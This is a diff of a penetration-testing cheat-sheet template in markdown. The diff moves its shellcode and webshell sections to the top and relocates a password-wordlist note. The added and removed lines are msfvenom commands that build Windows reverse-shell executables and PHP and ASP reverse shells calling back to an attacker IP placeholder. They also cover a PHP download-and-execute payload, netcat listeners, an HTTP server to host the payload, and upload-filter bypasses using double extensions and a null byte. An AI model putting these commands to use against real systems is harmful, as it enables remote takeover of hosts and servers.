@@ -1,10 +1,30 @@
 # Info-sheet
 
-- DNS-Domain name:
-- Host name:
-- OS:
-- Workgroup:
-- Windows domain:
+### Shellcode
+```
+# Binary
+msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=4444 -f exe -o shell.exe
+nc -lvnp 4444
+```
+### Webshell
+```
+# PHP Download Execute
+msfvenom -p php/download_exec URL=http://MYIPADDRESS/shell.exe -f raw -o shell.php
+msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f exe -o shell.exe
+python -m SimpleHTTPServer 80
+nc -lvnp 443
+
+# PHP
+msfvenom -p php/reverse_php LHOST=MYIPADDRESS LPORT=80 -f raw -o shell.php
+*use meterpreter multihandler
+
+# ASP
+msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f asp -o shell.asp
+nc -lvnp 443
+
+Use burp when trying to upload files. Try shell.php.jpeg and change the content type, modify the upload name, or use a nullbyte
+shell.php%00.jpeg
+```
 
 ### Full TCP Scan
 INSERTFULLTCPSCAN
@@ -360,13 +380,6 @@ If the .asp extention is not allowed, try shell.asp.txt and use the mv command
 user: wampp
 pass: xampp 
 ```
-
-### Password brute force - last resort
-
-```
-cewl http://INSERTIPADDRESS
-```
-
 ### Find sploits - Searchsploit and google
 
 Where there are many exploits for a software, use google. It will automatically sort it by popularity.
@@ -383,37 +396,10 @@ searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"
 searchsploit -t Apache | grep -v '/dos/'
 ```
 
-### Shellcode
+### Password brute force - last resort
+
 ```
-# Binary
-msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=4444 -f exe -o shell.exe
-nc -lvnp 4444
-
-# PHP Download Execute
-msfvenom -p php/download_exec URL=http://MYIPADDRESS/shell.exe -f raw -o shell.php
-msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f exe -o shell.exe
-python -m SimpleHTTPServer 80
-nc -lvnp 443
-```
-
-### Webshell
-```
-# PHP Download Execute
-msfvenom -p php/download_exec URL=http://MYIPADDRESS/shell.exe -f raw -o shell.php
-msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f exe -o shell.exe
-python -m SimpleHTTPServer 80
-nc -lvnp 443
-
-# PHP
-msfvenom -p php/reverse_php LHOST=MYIPADDRESS LPORT=80 -f raw -o shell.php
-*use meterpreter multihandler
-
-# ASP
-msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f asp -o shell.asp
-nc -lvnp 443
-
-Use burp when trying to upload files. Try shell.php.jpeg and change the content type, modify the upload name, or use a nullbyte
-shell.php%00.jpeg
+cewl http://INSERTIPADDRESS
 ```
 ----------------------------------------------------------------------------
 
